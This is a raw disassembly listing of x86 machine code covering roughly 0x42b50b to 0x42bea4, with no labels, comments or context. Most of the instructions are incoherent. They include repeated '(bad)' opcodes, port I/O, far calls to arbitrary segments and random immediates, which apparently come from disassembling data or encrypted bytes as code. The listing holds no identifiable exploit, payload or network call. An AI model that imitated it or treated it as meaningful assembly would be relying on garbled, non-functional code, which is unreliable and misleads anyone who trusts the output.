  42b50b:	dec    edx
  42b50c:	(bad)  
  42b50d:	xchg   esi,eax
  42b50e:	mov    BYTE PTR [ecx+eax*4],bh
  42b511:	pop    esp
  42b512:	fwait
  42b513:	push   edx
  42b514:	sub    eax,0xd0788f31
  42b519:	out    dx,al
  42b51a:	loopne 0x42b586
  42b51c:	nop
  42b51d:	(bad)  
  42b51e:	stos   DWORD PTR es:[edi],eax
  42b51f:	ret    0x794e
  42b522:	(bad)
  42b526:	in     al,0xa
  42b528:	jge    0x42b505
  42b52a:	adc    dl,bh
  42b52c:	nop
  42b52d:	mov    al,ds:0x6ddf59fb
  42b532:	fs adc al,0x36
  42b535:	cmp    BYTE PTR [eax-0x21],bh
  42b538:	fdiv   QWORD PTR [ecx+0x46]
  42b53b:	cwde   
  42b53c:	xor    al,BYTE PTR [ecx+edx*1-0x1f]
  42b540:	in     eax,0xbd
  42b542:	mov    ah,0x38
  42b544:	jae    0x42b4fb
  42b546:	fwait
  42b547:	rcr    BYTE PTR [edx],cl
  42b549:	jge    0x42b50b
  42b54b:	mov    ds:0x77e3e2b,al
  42b550:	leave  
  42b551:	das    
  42b552:	mov    ebx,0xaef47270
  42b557:	pushw  0xffe7
  42b55a:	out    0x38,al
  42b55c:	(bad)  
  42b55e:	pop    es
  42b55f:	loopne 0x42b5dd
  42b561:	jnp    0x42b4ec
  42b563:	fimul  DWORD PTR ds:0x63f709b6
  42b569:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b56a:	(bad)  
  42b56b:	mov    ebp,0x5835f203
  42b570:	(bad)  
  42b571:	jl     0x42b552
  42b573:	mov    al,ds:0xb792de0d
  42b578:	ss jp  0x42b5d5
  42b57b:	pop    es
  42b57c:	loope  0x42b5c3
  42b57e:	fidiv  WORD PTR [ebx+eax*4]
  42b581:	xchg   esp,eax
  42b582:	sub    DWORD PTR [esi],ebp
  42b584:	mov    ebx,0x395b4d91
  42b589:	dec    ebx
  42b58a:	pop    eax
  42b58b:	push   cs
  42b58c:	add    BYTE PTR [edx-0x3f],cl
  42b58f:	sub    al,0x9f
  42b591:	push   edx
  42b592:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b593:	aam    0x28
  42b595:	xchg   eax,esi
  42b597:	jnp    0x42b612
  42b599:	and    cl,BYTE PTR [esi+0x555ce710]
  42b59f:	pop    edi
  42b5a0:	fwait
  42b5a1:	aaa    
  42b5a2:	pop    ds
  42b5a3:	and    DWORD PTR [ecx],edx
  42b5a5:	repz iret 
  42b5a7:	lds    ebx,FWORD PTR [edx+0xa]
  42b5aa:	pusha  
  42b5ab:	imul   esi,DWORD PTR [edi-0x5d0b6b2f],0x24
  42b5b2:	std    
  42b5b3:	retf   
  42b5b4:	addr16 mov ecx,0xcedce14d
  42b5ba:	cmp    DWORD PTR ds:0xae132e1a,0x1557eabe
  42b5c4:	(bad)  es:0x85f8af7
  42b5cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b5cc:	pop    eax
  42b5cd:	sub    DWORD PTR [edx-0x5c2ef8ed],esp
  42b5d3:	sub    BYTE PTR [ecx+ebp*4+0x6e60dd80],cl
  42b5da:	jp     0x42b5ec
  42b5dc:	(bad)  
  42b5dd:	aam    0xd
  42b5df:	mov    ss,WORD PTR ds:[esi]
  42b5e2:	mov    bl,0x52
  42b5e4:	mov    bh,0x46
  42b5e6:	and    esi,ecx
  42b5e8:	mov    ebx,0x86e6cd81
  42b5ed:	sbb    BYTE PTR [eax],al
	...
  42b653:	add    BYTE PTR [eax],al
  42b655:	add    al,ah
  42b657:	xchg   esp,eax
  42b658:	and    bh,cl
  42b65a:	je     0x42b65b
  42b65c:	out    dx,eax
  42b65d:	mov    edi,0x1397875f
  42b662:	stc    
  42b663:	or     al,0x57
  42b665:	sub    esp,DWORD PTR [edi-0x2f]
  42b668:	add    DWORD PTR [eax],eax
  42b66a:	add    BYTE PTR [ecx],al
  42b66c:	add    BYTE PTR [eax],al
  42b66e:	push   edi
  42b66f:	mov    BYTE PTR [ebx],bh
  42b671:	xlat   BYTE PTR ds:[ebx]
  42b672:	jae    0x42b6a2
  42b674:	xor    eax,0x6d39612f
  42b679:	fwait
  42b67a:	(bad)  
  42b67b:	mov    ah,0xcb
  42b67d:	test   BYTE PTR [esi],cl
  42b67f:	shr    BYTE PTR [esi+0x39878f6a],1
  42b685:	mov    dh,bh
  42b687:	mov    bl,0x87
  42b689:	jne    0x42b6aa
  42b68b:	sti    
  42b68c:	and    al,0xac
  42b68e:	sbb    BYTE PTR ds:0x22395f2b,dh
  42b694:	mov    ds:0xb76a8525,eax
  42b699:	popa   
  42b69a:	dec    eax
  42b69b:	pushf  
  42b69c:	popa   
  42b69d:	add    esp,ecx
  42b69f:	jae    0x42b69f
  42b6a1:	retf   0xb28f
  42b6a4:	(bad)  
  42b6a5:	aad    0xe6
  42b6a7:	andnps xmm1,XMMWORD PTR cs:[edx]
  42b6ab:	cmp    al,0x6d
  42b6ad:	in     eax,dx
  42b6ae:	int    0x0
  42b6b0:	sub    bh,BYTE PTR [ebp+0x7264c68f]
  42b6b6:	jecxz  0x42b666
  42b6b8:	jp     0x42b691
  42b6ba:	pop    esp
  42b6bb:	mov    ch,0x88
  42b6bd:	inc    ebp
  42b6be:	push   0xb92716b4
  42b6c3:	push   ds
  42b6c4:	fwait
  42b6c5:	iret   
  42b6c6:	jecxz  0x42b71e
  42b6c8:	jmp    0x7ac742cf
  42b6cd:	dec    ebx
  42b6ce:	adc    eax,0xf09e5333
  42b6d3:	inc    esi
  42b6d4:	pop    ecx
  42b6d5:	mov    dl,0x8c
  42b6d7:	popf   
  42b6d8:	push   ebp
  42b6d9:	mov    edi,0xaccaf2a6
  42b6de:	outs   dx,BYTE PTR ds:[esi]
  42b6df:	mov    bl,0x16
  42b6e1:	ja     0x42b759
  42b6e3:	cmp    bl,ah
  42b6e5:	sti    
  42b6e6:	xor    edx,DWORD PTR [ebp+ebx*1+0x78c1b044]
  42b6ed:	push   ss
  42b6ee:	adc    al,0xcf
  42b6f0:	ss into 
  42b6f2:	adc    al,0xd3
  42b6f4:	out    0xe8,eax
  42b6f6:	jmp    0x8e5c0114
  42b6fb:	mov    eax,0x90667eb7
  42b700:	xchg   BYTE PTR [edx-0xe2be2d0],ch
  42b706:	mov    edi,edi
  42b708:	add    DWORD PTR [esi+0x15],ecx
  42b70b:	xchg   esp,eax
  42b70c:	js     0x42b76f
  42b70e:	fcom   QWORD PTR [ebp+0x5f64fec7]
  42b714:	out    dx,eax
  42b715:	std    
  42b716:	mov    WORD PTR [edx],?
  42b718:	jns    0x42b6b0
  42b71a:	(bad)  
  42b71c:	adc    eax,0x14b2d7e1
  42b721:	popf   
  42b722:	jae    0x42b6b3
  42b724:	mov    ds:0xaf3fb8f6,al
  42b729:	xchg   BYTE PTR [ecx+eax*1+0x49],cl
  42b72d:	mov    al,ds:0x8fe641c7
  42b732:	mov    eax,0x609a2436
  42b737:	idiv   DWORD PTR [ebp+0x78]
  42b73a:	int3   
  42b73b:	fiadd  WORD PTR [edi]
  42b73d:	sahf   
  42b73e:	je     0x42b784
  42b740:	xchg   ebx,eax
  42b741:	add    ebx,DWORD PTR [edi-0x28a3d57a]
  42b747:	mov    ah,0xeb
  42b749:	mov    ch,0xbc
  42b74b:	and    DWORD PTR [eax],ecx
  42b74d:	lahf   
  42b74e:	push   cs
  42b74f:	cmp    eax,0x8a7480ea
  42b754:	mov    bh,0x4a
  42b756:	and    esp,ebp
  42b758:	jecxz  0x42b6e3
  42b75a:	out    0x42,al
  42b75c:	es push cs
  42b75e:	add    al,0xf3
  42b760:	sub    cl,bl
  42b762:	add    ah,BYTE PTR ds:0x29e9de01
  42b768:	sub    eax,DWORD PTR ds:0x9dc6cfe1
	...
  42b7d6:	dec    esi
  42b7d7:	inc    edx
  42b7d8:	dec    ecx
  42b7d9:	daa    
  42b7da:	dec    ebp
  42b7db:	das    
  42b7dc:	outs   dx,BYTE PTR ds:[esi]
  42b7dd:	imul   edx,edx,0x63
  42b7e0:	push   ecx
  42b7e1:	xchg   edx,eax
  42b7e2:	sbb    esp,0xd2675c1b
  42b7e8:	add    DWORD PTR [eax],eax
  42b7ea:	add    BYTE PTR [ecx],al
  42b7ec:	add    BYTE PTR [eax],al
  42b7ee:	gs xchg esp,eax
  42b7f0:	aaa    
  42b7f1:	mov    bh,0x4f
  42b7f3:	(bad)  
  42b7f4:	dec    edx
  42b7f5:	pushf  
  42b7f6:	xchg   DWORD PTR [esi],ebp
  42b7f8:	and    eax,0x277b389e
  42b7fd:	jbe    0x42b784
  42b7ff:	jno    0x42b7c2
  42b801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b802:	mov    esi,0x747a009c
  42b807:	loopne 0x42b80f
  42b809:	pop    ecx
  42b80a:	retf   0x8e84
  42b80d:	addr16 xchg edx,eax
  42b80f:	arpl   WORD PTR [ebp+0x6d1d9e59],bx
  42b815:	push   ebx
  42b816:	bound  ecx,QWORD PTR gs:[eax+0x75]
  42b81a:	into   
  42b81b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b81c:	pop    ecx
  42b81d:	mov    esi,0xdb3b36e
  42b822:	pop    es
  42b823:	or     cl,BYTE PTR [edx+eiz*1-0x4e98e5a3]
  42b82a:	jbe    0x42b7b1
  42b82c:	cmp    al,dh
  42b82e:	xchg   BYTE PTR [ecx-0x4d79801d],al
  42b834:	add    ebp,esi
  42b836:	mov    esi,0x61f4d409
  42b83b:	cmp    BYTE PTR [esi],bl
  42b83d:	pop    ecx
  42b83e:	(bad)  
  42b83f:	sub    al,0x3d
  42b841:	nop
  42b842:	(bad)  
  42b843:	push   cs
  42b844:	(bad)  
  42b845:	mov    WORD PTR ds:0x769d3f1e,gs
  42b84b:	xor    DWORD PTR [esi-0x28a8c6dc],edi
  42b851:	or     al,0xe1
  42b853:	test   eax,0xdee2bef1
  42b858:	aas    
  42b859:	xor    edi,DWORD PTR [ebp+eax*2+0x78b1d8b4]
  42b860:	cmp    cl,bl
  42b862:	icebp  
  42b863:	psubb  mm0,QWORD PTR [ebx]
  42b866:	or     eax,0x611f9018
  42b86b:	pop    ebx
  42b86c:	xchg   edi,eax
  42b86d:	add    al,0x54
  42b86f:	adc    DWORD PTR [ebp+eiz*8+0x7e424f5e],eax
  42b876:	jmp    FWORD PTR [esi+0x6814b9de]
  42b87c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b87d:	ret    
  42b87e:	fisubr DWORD PTR [eax]
  42b880:	inc    edi
  42b881:	dec    edi
  42b882:	ins    BYTE PTR es:[edi],dx
  42b883:	mov    bh,BYTE PTR [esi-0x7503ffa2]
  42b889:	and    eax,esi
  42b88b:	(bad)  
  42b88c:	push   ebx
  42b88d:	sub    al,0xa5
  42b88f:	ret    
  42b890:	mov    ebx,0x9638d09
  42b895:	in     al,0x5e
  42b897:	fbld   TBYTE PTR [ebx]
  42b899:	fmul   QWORD PTR gs:0xe8aa7cdc
  42b8a0:	push   edi
  42b8a1:	xchg   esi,eax
  42b8a2:	ins    DWORD PTR es:[edi],dx
  42b8a3:	xchg   ecx,eax
  42b8a4:	sub    al,ch
  42b8a6:	inc    ecx
  42b8a7:	mov    cl,0xd2
  42b8a9:	cwde   
  42b8aa:	das    
  42b8ab:	ds (bad) 
  42b8ad:	(bad)  
  42b8ae:	mov    ah,0xf4
  42b8b0:	lods   eax,DWORD PTR ds:[esi]
  42b8b1:	out    dx,eax
  42b8b2:	add    cl,bh
  42b8b4:	pop    edi
  42b8b5:	xchg   ecx,eax
  42b8b6:	jl     0x42b8d7
  42b8b8:	adc    al,0x43
  42b8ba:	mov    esp,0xb8967f11
  42b8bf:	mov    DWORD PTR [esp+eax*8],esi
  42b8c2:	in     eax,0xe5
  42b8c4:	cwde   
  42b8c5:	les    ecx,FWORD PTR [edx-0x13a3c9f5]
  42b8cb:	xchg   edi,eax
  42b8cc:	inc    ebx
  42b8cd:	aas    
  42b8ce:	push   es
  42b8cf:	and    eax,0xd66731f1
  42b8d4:	into   
  42b8d5:	pop    ss
  42b8d6:	retf   0xc5e0
  42b8d9:	(bad)  
  42b8da:	mov    edi,0x28f89864
  42b8df:	mov    edx,0xb90b8d39
  42b8e4:	dec    ecx
  42b8e5:	sub    edi,DWORD PTR [esi]
  42b8e7:	jb     0x42b8cd
  42b8e9:	in     al,dx
  42b8ea:	sti    
  42b8eb:	pop    ds
  42b8ec:	xchg   edi,eax
  42b8ed:	sahf   
	...
  42b956:	call   0x2a77f8
  42b95b:	out    0xf9,eax
  42b95d:	lahf   
  42b95e:	ret    0x608c
  42b961:	or     esp,DWORD PTR [ebx+0x677c8113]
  42b967:	rol    DWORD PTR [ecx],cl
  42b969:	add    BYTE PTR [eax],al
  42b96b:	add    DWORD PTR [eax],eax
  42b96d:	add    BYTE PTR ds:0x56886449,al
  42b973:	cld    
  42b974:	adc    DWORD PTR [esi+0x54171940],edi
  42b97a:	mov    esp,0x93bb8cc5
  42b97f:	mov    ch,0xd4
  42b981:	adc    ah,dh
  42b983:	sub    edi,DWORD PTR [ecx]
  42b985:	xlat   BYTE PTR ds:[ebx]
  42b986:	jle    0x42b9ea
  42b988:	inc    edx
  42b989:	shl    DWORD PTR ds:0xa8dd4781,1
  42b98f:	(bad)  
  42b990:	pop    ecx
  42b991:	fsubr  DWORD PTR [ebx-0x5719f938]
  42b997:	xor    ch,BYTE PTR [esi-0x29]
  42b99a:	jb     0x42b9a9
  42b99c:	pop    ds
  42b99d:	add    al,0x93
  42b99f:	mov    BYTE PTR [edi-0x6ec37a12],al
  42b9a5:	xchg   esi,eax
  42b9a6:	jge    0x42ba03
  42b9a8:	jp     0x42ba03
  42b9aa:	lea    edi,[ecx]
  42b9ac:	mov    BYTE PTR [edx+ebp*2-0x59],al
  42b9b0:	aaa    
  42b9b1:	sbb    bl,BYTE PTR cs:[eax+0x4d]
  42b9b5:	jl     0x42b971
  42b9b7:	pop    ds
  42b9b8:	and    DWORD PTR [ebx+0x5],ecx
  42b9bb:	pop    ebp
  42b9bc:	pop    eax
  42b9bd:	js     0x42b957
  42b9bf:	mov    ebx,?
  42b9c1:	shl    BYTE PTR ds:0x90f26f82,1
  42b9c7:	cli    
  42b9c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b9c9:	add    eax,0xc8f9708b
  42b9ce:	mov    ds:0xf9f17622,eax
  42b9d3:	bound  esi,QWORD PTR [esi+0x4248faaf]
  42b9d9:	iret   
  42b9da:	test   al,bl
  42b9dc:	call   DWORD PTR [edi-0x3f]
  42b9df:	adc    BYTE PTR [ebp-0x39],cl
  42b9e2:	or     esi,DWORD PTR [esi-0x72fdba]
  42b9e8:	aaa    
  42b9e9:	cli    
  42b9ea:	repnz sahf 
  42b9ec:	rol    DWORD PTR [ebx],cl
  42b9ee:	adc    eax,0x31849b69
  42b9f3:	pop    es
  42b9f4:	ja     0x42ba68
  42b9f6:	imul   esp,DWORD PTR [ecx+0x62],0x6540d57e
  42b9fd:	gs mov edi,0xebefe3e3
  42ba03:	pusha  
  42ba04:	jnp    0x42b99f
  42ba06:	sar    BYTE PTR [ecx-0x7f41f5a0],0x6d
  42ba0d:	loope  0x42b9e3
  42ba0f:	test   DWORD PTR [edi+ebp*8-0x40],eax
  42ba13:	mov    esi,0x4462b8c
  42ba18:	mov    edx,0x26f0ba63
  42ba1d:	out    dx,al
  42ba1e:	push   es
  42ba1f:	scas   al,BYTE PTR es:[edi]
  42ba20:	aam    0xaf
  42ba22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ba23:	xor    DWORD PTR [ebx+eax*2],ebp
  42ba26:	lock inc DWORD PTR [ebp+0x73]
  42ba2a:	mov    eax,ds:0xfd47f685
  42ba2f:	adc    eax,0xd255036f
  42ba34:	data16 out 0xd2,al
  42ba37:	ja     0x42b9cb
  42ba39:	ins    DWORD PTR es:[edi],dx
  42ba3a:	push   eax
  42ba3b:	sub    DWORD PTR [esi],ebx
  42ba3d:	or     BYTE PTR [ecx+0xb],bl
  42ba40:	and    al,0x5c
  42ba42:	(bad)  
  42ba43:	jle    0x42b9d2
  42ba45:	fstp   TBYTE PTR ds:0x93a08f4b
  42ba4b:	dec    edx
  42ba4c:	dec    esi
  42ba4d:	mov    bh,0x31
  42ba4f:	jbe    0x42baa9
  42ba51:	mov    ch,0xf9
  42ba53:	jle    0x42bac1
  42ba55:	push   esp
  42ba56:	cmc    
  42ba57:	add    ch,BYTE PTR [esi]
  42ba59:	cmp    eax,0x17d7e0f6
  42ba5e:	scas   al,BYTE PTR es:[edi]
  42ba5f:	pushf  
  42ba60:	xor    DWORD PTR [ecx+0x28],edi
  42ba63:	jecxz  0x42ba0f
  42ba65:	xchg   esp,eax
  42ba66:	jns    0x42bac2
  42ba68:	dec    ebp
  42ba69:	or     ecx,DWORD PTR [ecx]
  42ba6b:	inc    edi
  42ba6c:	std    
  42ba6d:	cmc    
	...
  42bad6:	mov    eax,DWORD PTR [edi]
  42bad8:	mov    al,0xe2
  42bada:	mov    esp,0x6a6fdbf7
  42badf:	pop    ebx
  42bae0:	xchg   ecx,eax
  42bae1:	or     eax,esp
  42bae3:	sbb    al,0x86
  42bae5:	and    BYTE PTR [edi-0x2c],ah
  42bae8:	add    DWORD PTR [eax],eax
  42baea:	add    BYTE PTR [ecx],al
  42baec:	add    BYTE PTR [eax],al
  42baee:	adc    al,0xec
  42baf0:	not    BYTE PTR [eax+0x312f05dc]
  42baf6:	loop   0x42bb56
  42baf8:	mov    WORD PTR [eax+ebx*1],?
  42bafb:	adc    BYTE PTR [esi-0x214db602],dh
  42bb01:	push   edx
  42bb02:	repz push ecx
  42bb04:	mov    bl,0xf2
  42bb06:	cmp    ah,BYTE PTR [edx-0xd]
  42bb09:	sub    BYTE PTR [ecx],cl
  42bb0b:	loopne 0x42bb2b
  42bb0d:	xor    al,0x4a
  42bb0f:	pop    esi
  42bb10:	loope  0x42bb27
  42bb12:	cli    
  42bb13:	add    al,0xc
  42bb15:	ds aaa 
  42bb17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bb18:	rcr    BYTE PTR [eax-0x3bcff6d9],0x5b
  42bb1f:	aaa    
  42bb20:	sub    esi,DWORD PTR [ecx+0x3dbff6bb]
  42bb26:	stc    
  42bb27:	xor    eax,0x49117d0a
  42bb2c:	cmp    bl,BYTE PTR [esi+0x7146d325]
  42bb32:	call   0x2987:0x94804f34
  42bb39:	push   0x9d92635
  42bb3e:	or     dl,0xd1
  42bb41:	inc    edx
  42bb42:	fcmovnb st,st(7)
  42bb44:	daa    
  42bb45:	stc    
  42bb46:	xchg   esp,eax
  42bb47:	inc    esi
  42bb48:	mov    DWORD PTR [ebx],0x669e1af8
  42bb4e:	mov    bl,0x48
  42bb50:	popa   
  42bb51:	int3   
  42bb52:	mov    ebx,0xa4b64faf
  42bb57:	sar    DWORD PTR [ebp+edx*4+0x1092a4af],0x4e
  42bb5f:	gs retf 0x240a
  42bb63:	daa    
  42bb64:	sbb    bl,BYTE PTR [ecx+eiz*8-0x66]
  42bb68:	retf   
  42bb69:	pop    eax
  42bb6a:	push   ebx
  42bb6b:	push   ss
  42bb6c:	dec    edi
  42bb6d:	xchg   edi,eax
  42bb6e:	mov    ds:0x8a7ff1e1,eax
  42bb73:	rol    BYTE PTR [esi+0x6d],cl
  42bb76:	std    
  42bb77:	inc    ebp
  42bb78:	(bad)  
  42bb79:	cld    
  42bb7a:	in     eax,0x15
  42bb7c:	add    edx,eax
  42bb7e:	ret    
  42bb7f:	sub    DWORD PTR [eax+0x5],esi
  42bb82:	mov    al,dh
  42bb84:	xchg   BYTE PTR [esi+ebx*1+0x2a],al
  42bb88:	inc    ebp
  42bb89:	shl    BYTE PTR [edi+esi*2-0x43db58c3],1
  42bb90:	xor    ch,BYTE PTR [edx]
  42bb92:	adc    al,0x56
  42bb94:	mov    eax,ds:0x3766db5
  42bb99:	daa    
  42bb9a:	xchg   eax,edx
  42bb9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bb9d:	inc    eax
  42bb9e:	ror    DWORD PTR [esi-0x48],1
  42bba1:	or     DWORD PTR [ecx-0x2a1f588d],esi
  42bba7:	push   esp
  42bba8:	loopne 0x42bb3f
  42bbaa:	in     eax,0x10
  42bbac:	ins    DWORD PTR es:[edi],dx
  42bbad:	or     edx,edi
  42bbaf:	daa    
  42bbb0:	loope  0x42bbc0
  42bbb2:	arpl   WORD PTR [esi],bp
  42bbb4:	sub    bh,BYTE PTR ds:0x4e79b76c
  42bbba:	cmp    edi,DWORD PTR [ebx-0x1]
  42bbbd:	scas   eax,DWORD PTR es:[edi]
  42bbbe:	jle    0x42bb80
  42bbc0:	dec    ecx
  42bbc1:	(bad)  
  42bbc2:	clc    
  42bbc3:	fistp  DWORD PTR [edx-0xb96d562]
  42bbc9:	mov    dh,0x2a
  42bbcb:	fld    DWORD PTR [edi+0x52]
  42bbce:	sub    DWORD PTR [esi],esi
  42bbd0:	cmp    al,0xa2
  42bbd2:	mov    ebp,0x3a185159
  42bbd7:	xor    al,0x0
  42bbd9:	aad    0x60
  42bbdb:	cmp    eax,ebp
  42bbdd:	jecxz  0x42bba9
  42bbdf:	fcmovnu st,st(7)
  42bbe1:	in     al,0x98
  42bbe3:	inc    eax
  42bbe4:	cmp    esi,DWORD PTR [edi]
  42bbe6:	pop    ebp
  42bbe7:	div    WORD PTR [ecx]
  42bbea:	xor    DWORD PTR [edi+0xc415],ebp
	...
  42bc54:	add    BYTE PTR [eax],al
  42bc56:	xor    al,0x28
  42bc58:	add    DWORD PTR [esi],eax
  42bc5a:	sbb    eax,0x233a372f
  42bc5f:	sub    DWORD PTR [ebx],eax
  42bc61:	dec    ecx
  42bc62:	lahf   
  42bc63:	xor    bh,BYTE PTR [eax]
  42bc65:	les    esp,FWORD PTR [edi-0x2b]
  42bc68:	add    DWORD PTR [eax],eax
  42bc6a:	add    BYTE PTR [ecx],al
  42bc6c:	add    BYTE PTR [eax],al
  42bc6e:	fsub   DWORD PTR [esi+0x57]
  42bc71:	pop    es
  42bc72:	and    DWORD PTR [edi+0x78],ebp
  42bc75:	pop    ss
  42bc76:	daa    
  42bc77:	jmp    FWORD PTR [ebp-0x4c]
  42bc7a:	sub    al,BYTE PTR [eax-0x4dee3a42]
  42bc80:	jg     0x42bcaf
  42bc82:	pusha  
  42bc83:	lock rol BYTE PTR [bp+di-0x75],1
  42bc88:	sub    DWORD PTR [eax],ebp
  42bc8a:	fmul   st,st(3)
  42bc8c:	dec    ebp
  42bc8d:	and    DWORD PTR [edi+0x45],esp
  42bc90:	mov    dl,dh
  42bc92:	pop    edi
  42bc93:	push   ds
  42bc94:	cmc    
  42bc95:	jmp    0x60dfd11e
  42bc9a:	jl     0x42bc2c
  42bc9c:	ja     0x42bc7c
  42bc9e:	outs   dx,DWORD PTR ds:[esi]
  42bc9f:	sbb    ebp,esi
  42bca1:	fcmovnbe st,st(5)
  42bca3:	jle    0x42bc2b
  42bca5:	cwde   
  42bca6:	sub    eax,DWORD PTR [eax+0x65]
  42bca9:	push   cs
  42bcaa:	test   eax,0x18fbd828
  42bcb0:	jecxz  0x42bc40
  42bcb2:	(bad)  
  42bcb3:	or     DWORD PTR [ebx+0x2b],edi
  42bcb6:	mov    edi,0x76fc865f
  42bcbb:	jnp    0x42bc9a
  42bcbd:	scas   al,BYTE PTR es:[edi]
  42bcbe:	push   0xffffffcf
  42bcc0:	and    esp,DWORD PTR [edi]
  42bcc2:	lods   eax,DWORD PTR ds:[esi]
  42bcc3:	or     eax,0x17c4e37c
  42bcc8:	in     eax,0x8b
  42bcca:	push   ebp
  42bccb:	xor    edi,ebx
  42bccd:	(bad)  
  42bcce:	div    BYTE PTR ds:0x391cfc2e
  42bcd4:	ficom  WORD PTR [edx]
  42bcd6:	(bad)  
  42bcd7:	(bad)  
  42bcd8:	cli    
  42bcd9:	add    BYTE PTR [ebp-0x5f],bl
  42bcdc:	or     dl,ah
  42bcde:	and    DWORD PTR [eax-0x16],edx
  42bce1:	mov    esi,0xb6507237
  42bce6:	idiv   DWORD PTR [esi]
  42bce8:	lods   al,BYTE PTR ds:[esi]
  42bce9:	inc    eax
  42bcea:	(bad)  
  42bceb:	fmul   st,st(0)
  42bced:	inc    esi
  42bcee:	jge    0x42bcae
  42bcf0:	or     cl,BYTE PTR [edi+0x7174a8e4]
  42bcf6:	xor    DWORD PTR [edi+0x4ba36663],esi
  42bcfc:	jo     0x42bd3f
  42bcfe:	pusha  
  42bcff:	mov    ebp,0x57ac1085
  42bd04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bd05:	stos   BYTE PTR es:[edi],al
  42bd06:	mov    ah,0x16
  42bd08:	adc    dl,BYTE PTR [ebp+0x7b957c03]
  42bd0e:	and    BYTE PTR [edi],dh
  42bd10:	rol    BYTE PTR [ebx],cl
  42bd12:	and    al,al
  42bd14:	cmp    eax,0xae69518e
  42bd19:	mov    ecx,DWORD PTR [eax-0x26]
  42bd1c:	inc    eax
  42bd1d:	test   cl,al
  42bd1f:	clc    
  42bd20:	sbb    esi,esp
  42bd22:	adc    DWORD PTR [ecx-0xdbde494],ebp
  42bd28:	jb     0x42bcbc
  42bd2a:	or     DWORD PTR [edx-0x5c7c5cb1],ebx
  42bd30:	push   cs
  42bd31:	test   al,0x2c
  42bd33:	cli    
  42bd34:	xchg   esi,eax
  42bd35:	shl    BYTE PTR [eax],cl
  42bd37:	int    0x9a
  42bd39:	push   es
  42bd3a:	cli    
  42bd3b:	fsubr  st,st(7)
  42bd3d:	ja     0x42bcc6
  42bd3f:	jno    0x42bd9e
  42bd41:	jle    0x42bd77
  42bd43:	fcomp  QWORD PTR [ecx+ecx*8-0x75]
  42bd47:	mov    esi,0xee326f4c
  42bd4c:	mov    edi,DWORD PTR [ebp-0x1d24c3b3]
  42bd52:	out    0xb7,al
  42bd54:	or     al,0x15
  42bd56:	push   esi
  42bd57:	mov    ds,WORD PTR [edi-0x42]
  42bd5a:	cmp    BYTE PTR [esi-0x320e2c9e],0xde
  42bd61:	mov    BYTE PTR [edx],0x24
  42bd64:	out    0x48,al
  42bd66:	scas   al,BYTE PTR es:[edi]
  42bd67:	imul   ebx,DWORD PTR [ebx],0x6f3495ab
  42bd6d:	mov    ebx,0x0
	...
  42bdd6:	mov    al,0xb6
  42bdd8:	pushf  
  42bdd9:	adc    al,0x9e
  42bddb:	ds mov eax,0xffec3b6
  42bde1:	jae    0x42bdd1
  42bde3:	mov    al,0xfb
  42bde5:	(bad)  
  42bde6:	addr16 (bad) 
  42bde8:	add    DWORD PTR [eax],eax
  42bdea:	add    BYTE PTR [ecx],al
  42bdec:	add    BYTE PTR [eax],al
  42bdee:	and    DWORD PTR [esi-0x7d5a91e8],0x10
  42bdf5:	pop    ss
  42bdf6:	(bad)  
  42bdf7:	jg     0x42bdba
  42bdf9:	data16 mov cl,0xb0
  42bdfc:	mov    ah,0x62
  42bdfe:	xchg   esp,eax
  42bdff:	pop    ecx
  42be00:	scas   al,BYTE PTR es:[edi]
  42be01:	jno    0x42be52
  42be03:	pusha  
  42be04:	out    dx,al
  42be05:	sub    al,0xc7
  42be07:	inc    edi
  42be08:	(bad)  
  42be09:	sub    BYTE PTR [edi+eax*8-0x1d],bh
  42be0d:	jbe    0x42be2a
  42be0f:	jno    0x42be19
  42be11:	xchg   BYTE PTR [ecx],al
  42be13:	in     eax,dx
  42be14:	aad    0xa4
  42be16:	(bad)  
  42be17:	test   al,0xad
  42be19:	(bad)  
  42be1a:	int    0xa4
  42be1c:	jbe    0x42be37
  42be1e:	in     al,dx
  42be1f:	(bad)  
  42be20:	out    dx,al
  42be21:	es cmp bl,bl
  42be24:	adc    bh,al
  42be26:	mov    ecx,0xaaf4dd63
  42be2b:	add    al,0xb4
  42be2d:	push   ss
  42be2e:	sbb    eax,0x98e882cd
  42be33:	and    al,0x84
  42be35:	jb     0x42be55
  42be37:	jnp    0x42bdce
  42be39:	ret    0xd8e1
  42be3c:	repnz sahf 
  42be3e:	jnp    0x42be16
  42be40:	mov    eax,ds:0x311b3435
  42be45:	fstp   QWORD PTR [ebx+0x7b]
  42be48:	mov    ebx,0x1647ea9d
  42be4d:	jns    0x42be7f
  42be4f:	pop    ecx
  42be50:	out    0x87,eax
  42be52:	je     0x42bec3
  42be54:	pop    ecx
  42be55:	fdiv   DWORD PTR [ecx+0x55]
  42be58:	cmp    BYTE PTR [edx+0x66618821],bl
  42be5e:	call   0x48c:0x71b89cb2
  42be65:	xor    esp,DWORD PTR [ebx+0x59aaf2bd]
  42be6b:	cmp    esi,DWORD PTR ds:0xd158e51f
  42be71:	cmp    al,0xc0
  42be74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42be75:	(bad)  
  42be76:	cmp    al,0xd
  42be78:	cmp    eax,0xff8a1b06
  42be7d:	mov    ch,0x2b
  42be7f:	mov    al,0x97
  42be81:	ret    
  42be82:	push   ss
  42be83:	xchg   edx,eax
  42be84:	dec    esp
  42be85:	push   cs
  42be86:	xor    edi,edx
  42be88:	enter  0x5381,0x79
  42be8c:	ja     0x42be54
  42be8e:	add    edi,DWORD PTR [eax]
  42be90:	ins    DWORD PTR es:[edi],dx
  42be91:	sub    BYTE PTR [ebx],ch
  42be93:	jno    0x42bebb
  42be95:	nop
  42be96:	xchg   edi,eax
  42be97:	(bad)  
  42be98:	outs   dx,DWORD PTR ds:[esi]
  42be99:	push   ds
  42be9a:	cwde   
  42be9b:	mov    ds:0xf578cc29,al
  42bea0:	ret    0x95d3
  42bea3:	scas   al,BYTE PTR es:[edi]
  42bea4:	sahf   
